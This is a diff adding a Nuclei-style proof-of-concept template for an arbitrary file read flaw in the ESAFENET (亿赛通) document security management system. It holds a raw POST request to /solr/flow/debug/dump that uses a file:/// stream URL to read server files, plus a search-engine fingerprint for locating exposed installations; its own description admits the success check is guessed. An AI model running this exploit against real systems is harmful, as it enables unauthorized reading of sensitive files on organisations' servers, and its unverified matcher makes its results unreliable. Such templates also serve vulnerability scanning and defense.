@@ -1,0 +1,42 @@
+id: poc-41172d497d4140c736f9
+info:
+  name: 亿赛通电子文档安全管理系统dump存在任意文件读取漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/41172d497d4140c736f904ac296f45b6
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: lfi,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: 41172d497d4140c736f904ac296f45b6
+    fofa: + hunter`app.name="ESAFENET 亿赛通文档安全管理系统"`
+http:
+- raw:
+  - 'POST /solr/flow/debug/dump?param=ContentStreams HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0
+
+    Accept: image/avif,image/webp,*/*
+
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+
+    Accept-Encoding: gzip, deflate, br
+
+    Connection: close
+
+    Cookie: JSESSIONID=31E80EEC9EE4DC0835A362E81A9D179F
+
+    Content-Type: application/x-www-form-urlencoded
+
+    Content-Length: 36
+
+
+    stream.url=file:///C:\Program Files\'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
